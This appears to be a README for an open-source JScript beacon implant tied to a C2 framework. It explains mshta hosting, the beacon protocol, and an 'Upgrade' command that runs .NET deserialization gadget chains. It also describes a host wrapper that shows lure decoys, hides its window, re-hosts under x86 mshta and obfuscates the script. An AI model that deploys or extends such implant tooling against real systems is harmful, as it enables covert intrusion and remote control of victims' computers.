# jscript-agent

The JScript HTTP-beacon agent for the [C2](https://github.com/mrzaxaryan/C2) platform — a single
static `.js` file ([`agent/jscript-agent.js`](agent/jscript-agent.js)) that turns its host process
(mshta in deployment, cscript for verification) into an implant with no payload download, no CLR
requirement, and no bitness constraint of its own.

It is pure ES3-era JScript (the engine inside `mshta.exe` / `cscript.exe`, JScript 5.8) — no
`XMLHttpRequest` host object assumptions, no JSON, no `let`/arrow functions. Every COM object it
touches (`WScript.Shell`, `MSXML2.ServerXMLHTTP`, `WbemScripting.SWbemLocator`,
`System.*` for the Upgrade arm) is activated through `ActiveXObject`.

## Environment contract

The agent carries **no baked configuration**. Its single input is the process environment:

| Variable | Meaning |
|---|---|
| `H_URL` | The beacon endpoint — the HTTP relay root (`https://<relay>/`). Empty or unset ⇒ the agent logs once and returns `'fail'`. |

Everything else (identity, machine architecture, OS version) is derived on the target at runtime.
`X-Agent-Capabilities` always ships `0800000000000000` (the
`UpgradeUsingInsecureBinaryDeserialization` bit, category 3) — every build of this agent carries
the Upgrade arm.

## Host contract

`runAgent()` is designed to be **nested inside a host master** — a wrapper script that owns all
window and process manipulation. The agent itself performs none. Concretely:

- It defines exactly one top-level symbol: `function runAgent()`. Everything else is nested inside.
- It **returns** instead of exiting: `'exit'` (operator sent Exit) or `'fail'` (endpoint unset,
  non-200 answer, or POST exception). The host decides what to do — typically quit the host
  process on either value.
- It calls `dbg(s)` **only if the host defined one** (`typeof dbg != 'undefined'` guard) — a
  host-provided debug logger that receives every log line. Under cscript, `log()` also echoes to
  stdout regardless of `dbg`.
- It reads `H_URL` from the process environment, so the host must set it (e.g. via
  `WScript.Shell.Environment('Process')('H_URL') = ...`) **before** calling `runAgent()` — and
  must re-set it in any re-hosted copy of the process, since environment state is per-process.

The C2 Windows-Infection master is the reference host: it emits `setHUrl()` (writes `H_URL`),
`openDecoy()` (lure media, gated to the x86 host), `hideWindow()` (resize + move off-screen),
`ensureX86Host()` (re-launch the polyglot under `%WINDIR%\SysWOW64\mshta.exe` on 64-bit hosts —
the x86 CLR is the only usable Upgrade target on every 64-bit OS incl. ARM64), then
`runAgent()`, then `quitHost()`:

```
setHUrl(); [openDecoy();] hideWindow(); if (ensureX86Host()) return; runAgent(); quitHost();
```

The x86 re-host matters because the Upgrade-delivered deserialization chain needs an x86 CLR
process; the pure beacon loop runs in any bitness (and standalone under cscript).

## Beacon contract (v2)

Spoken against the HTTP relay (see the `http-relay` worker — the beacon leg answers at its root):

- **POST** to `H_URL` with the full `X-Agent-*` identity set (API 1) on every request; body =
  hex(previous command's response), empty body when none is pending.
- **Every successful answer is `200 text/plain`**: body = hex(next command) in the shared binary
  protocol (`[opcode][payload]`), empty body = nothing queued. There is no 204; any non-200 is
  fatal.
- The relay holds each request server-side for a random 20–30 s; the agent's receive timeout is
  45 s (keep receive > max-hold + 10 s if the relay window ever grows). On an empty body the agent
  re-POSTs immediately.
- **Failure is fatal**: a non-200 status or a POST exception logs once and returns `'fail'` — no
  retry loop, no sleep primitive. Presence is re-established by re-delivery (e.g. on-logon
  persistence), not by the process burning CPU against a dead relay.

### Commands

| Opcode | Command | Behavior |
|---|---|---|
| `0x0A` | Exit | Sets the exit flag; the loop unwinds and `runAgent()` returns `'exit'`. |
| `0x0B` | Upgrade | Re-arms the process in place. Payload (ASCII text after the opcode): `!d=`/`!e=` control lines, `NAME=value` env-var lines, a blank line, then `stage1b64\nblobB64`. The agent pins `COMPLUS_Version` itself first (v2.0.50727 on Win7 / build 7600-7601, else v4.0.30319 — the same OS rule the C2 gadget compiler uses), applies the env lines, optionally deserializes the stage-1 blob, then deserializes the main gadget blob (plain drive, or script-driven delegate chain when `!d=1` + entry via `!e=`). Replies u32 as hex: `0` = chain completed, `1` = failed (log carries the message). |
| other | unknown | Replies u32 `2`. |

## Using it from C2

Add an Agents-table row (the C2 seeds one automatically):

- **Tags:** `windows, i386, x86_64, aarch64, http` — one arch-agnostic row; the agent derives the
  machine architecture at runtime (WMI `Win32_Processor.Architecture` with the env chain as
  fallback). The `http` transport tag is what the Windows-Infection generator resolves
  (`[windows, http]`), disjoint from the `ws`+`pic` rows the inject pipelines use.
- **URL:** the direct download URL of this file, e.g.
  `https://raw.githubusercontent.com/mrzaxaryan/jscript-agent/main/agent/jscript-agent.js`
  (fetched at generation time via the relay `/proxy`, then direct; raw.githubusercontent sends
  CORS `*` so the direct fetch works from the browser).

The generator embeds the fetched text verbatim into the master and runs the JScript obfuscation
pass over the whole thing, so this file must stay valid, self-contained JScript.

## Local verification

The agent runs dual-host by design — cscript is the verification path (no window, echo visible):

```
cscript //nologo some-master.js    # a master that sets H_URL, defines dbg, calls runAgent()
```

Expected: with `H_URL` unset, one `beacon endpoint not set` line and a clean exit; against a live
relay (`wrangler dev` in the `http-relay` repo), the beacon appears in `/status` with its parsed
`X-Agent-*` identity and answers queued commands.

## License

MIT — see [LICENSE](LICENSE). Usage is governed by [RESPONSIBLE_USE.md](RESPONSIBLE_USE.md) and
[SECURITY.md](SECURITY.md).
